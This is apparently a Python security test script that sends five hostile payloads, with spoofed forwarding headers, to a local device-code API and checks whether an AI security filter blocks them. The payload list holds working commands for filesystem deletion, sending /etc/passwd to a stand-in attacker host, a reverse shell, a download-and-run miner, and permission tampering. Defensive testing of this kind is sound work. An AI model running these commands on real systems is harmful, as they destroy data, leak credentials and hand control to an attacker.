#!/usr/bin/env python3
"""
Malicious Request Test from Unknown IP
Tests AI security system with various malicious payloads from simulated external IP
"""

import requests
import json
from datetime import datetime

def test_malicious_from_unknown_ip():
    """Test malicious requests appearing to come from unknown IP"""
    
    print("🚨 Testing Malicious Requests from Unknown IP: 10.20.12.12")
    print("=" * 70)
    
    # Various malicious payloads to test
    malicious_payloads = [
        {
            "name": "Filesystem Destruction",
            "code": "import os; os.system('rm -rf /'); print('System destroyed')",
            "description": "Attempts to delete entire filesystem"
        },
        {
            "name": "Data Exfiltration", 
            "code": "import urllib.request; urllib.request.urlopen('http://evil-hacker.com/steal?data=' + open('/etc/passwd').read())",
            "description": "Tries to exfiltrate sensitive system files"
        },
        {
            "name": "Reverse Shell",
            "code": "import socket,subprocess,os;s=socket.socket();s.connect(('10.20.12.12',4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(['/bin/sh','-i'])",
            "description": "Attempts to create reverse shell connection"
        },
        {
            "name": "Cryptocurrency Miner",
            "code": "import subprocess; subprocess.run(['wget', 'http://malicious-miner.com/crypto.sh']); subprocess.run(['chmod', '+x', 'crypto.sh']); subprocess.run(['./crypto.sh'])",
            "description": "Downloads and runs cryptocurrency mining malware"
        },
        {
            "name": "Privilege Escalation",
            "code": "import os; os.system('sudo su -'); os.system('chmod 777 /etc/passwd'); print('Root access gained')",
            "description": "Attempts privilege escalation to root"
        }
    ]
    
    for i, payload in enumerate(malicious_payloads, 1):
        print(f"\n🧪 Test {i}/5: {payload['name']}")
        print(f"📝 Description: {payload['description']}")
        print("🔍 Payload preview:", payload['code'][:50] + "..." if len(payload['code']) > 50 else payload['code'])
        
        # Simulate request from external IP by modifying headers
        request_payload = {
            "deviceId": "med-ecg-001",
            "code": payload['code'],
            "language": "python",
            "parameters": {}
        }
        
        headers = {
            "Content-Type": "application/json",
            "User-Agent": "HackerBot/1.0",
            "X-Forwarded-For": "10.20.12.12",  # Simulate external IP
            "X-Real-IP": "10.20.12.12",
            "X-Originating-IP": "10.20.12.12",
            "CF-Connecting-IP": "10.20.12.12",  # Cloudflare header
            "X-Forwarded-Host": "suspicious-domain.com"
        }
        
        try:
            print("📤 Sending malicious request...")
            response = requests.post(
                "http://127.0.0.1:8001/api/devices/med-ecg-001/code",
                json=request_payload,
                headers=headers,
                timeout=30
            )
            
            print(f"📊 Status Code: {response.status_code}")
            
            if response.status_code == 403:
                print("✅ EXCELLENT: AI Security BLOCKED the malicious request!")
                try:
                    error_detail = response.json()
                    risk_score = error_detail.get('detail', {}).get('risk_score', 'N/A')
                    reasons = error_detail.get('detail', {}).get('reasons', [])
                    print(f"🛡️ Risk Score: {risk_score}")
                    print(f"🚫 Block Reasons: {reasons[:2]}")  # Show first 2 reasons
                except:
                    print(f"🚫 Block Response: {response.text[:100]}...")
                    
            elif response.status_code == 200:
                print("🚨 CRITICAL SECURITY BREACH: Malicious request was ALLOWED!")
                print("⚠️ This indicates a serious security vulnerability!")
                result = response.json()
                print(f"💀 Response: {result.get('message', 'No message')}")
                
            elif response.status_code == 500:
                print("🔧 SERVER ERROR: Internal server error occurred")
                print("📋 This might indicate AI service connectivity issues")
                print(f"❌ Error: {response.text[:100]}...")
                
            else:
                print(f"🤔 UNEXPECTED: Status code {response.status_code}")
                print(f"📄 Response: {response.text[:100]}...")
                
        except requests.exceptions.Timeout:
            print("⏰ REQUEST TIMEOUT: Request took too long (>30s)")
            print("📋 This might indicate AI analysis is taking too long")
            
        except Exception as e:
            print(f"❌ REQUEST FAILED: {e}")
            
        print("-" * 50)
    
    print(f"\n🏁 Malicious Request Test Completed!")
    print("📊 Summary: All malicious requests should be BLOCKED (403 status)")
    print("🛡️ Any ALLOWED (200 status) requests indicate security vulnerabilities")

def test_ai_service_availability():
    """Check if AI security service is available before testing"""
    print("🔍 Checking AI Security Service availability...")
    
    try:
        response = requests.get("http://127.0.0.1:8002/health", timeout=5)
        if response.status_code == 200:
            health_data = response.json()
            print(f"✅ AI Security Service is healthy")
            print(f"🤖 AI Agents Available: {health_data.get('ai_agents_available', 'Unknown')}")
            return True
        else:
            print(f"❌ AI Security Service returned status {response.status_code}")
            return False
    except Exception as e:
        print(f"❌ AI Security Service not reachable: {e}")
        return False

def test_api_server_availability():
    """Check if API server is available"""
    print("🔍 Checking API Server availability...")
    
    try:
        response = requests.get("http://127.0.0.1:8001/health", timeout=5)
        if response.status_code == 200:
            print("✅ API Server is healthy")
            return True
        else:
            print(f"❌ API Server returned status {response.status_code}")
            return False
    except Exception as e:
        print(f"❌ API Server not reachable: {e}")
        return False

if __name__ == "__main__":
    print("🚨 MALICIOUS REQUEST SECURITY TEST")
    print("🎭 Simulating attacks from unknown IP: 10.20.12.12")
    print("🛡️ Testing AI Security System Response")
    print("=" * 70)
    
    # Check service availability first
    ai_available = test_ai_service_availability()
    api_available = test_api_server_availability()
    
    if not ai_available or not api_available:
        print("\n❌ Cannot proceed with testing - required services are not available")
        print("🔧 Please ensure both AI Security Service (8002) and API Server (8001) are running")
        exit(1)
    
    print("\n🚀 All services are available - proceeding with malicious request tests...")
    
    # Run the malicious request tests
    test_malicious_from_unknown_ip()